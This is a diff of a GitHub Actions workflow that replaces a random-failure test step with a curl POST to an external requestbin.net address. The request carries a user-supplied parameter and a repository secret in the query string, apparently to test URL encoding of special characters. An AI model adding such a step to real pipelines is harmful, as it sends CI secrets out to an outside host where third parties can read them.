@@ -1,15 +1,18 @@
 name: Build
 
 on:
-  - push
+  workflow_dispatch:
+    inputs:
+      url_parameter:
+        default: 'let''s URLEncode() this & share! yeaaah#'
+        required: true
 
 jobs:
   test:
     runs-on: ubuntu-20.04
     steps:
-      - name: Fail 1/4 of the builds
-        run: |
-          value=$(( $RANDOM % 4 ))
-          echo "Value is $value"
-          [ $value -ne 0 ]
-        shell: bash
+      - name: Query external URL
+        run: curl -s -XPOST "http://2zp0vr405qcvpx0o.b.requestbin.net?external=${EXTERNAL_PARAMETER}&secret=${SECRET_PART}"
+        env:
+          EXTERNAL_PARAMETER: ${{ github.event.inputs.url_parameter }}
+          SECRET_PART: ${{ secrets.SECRET_VARIABLE }} # Th"is sup\e;'r $ecret value &needs=encoding!# asf?jell
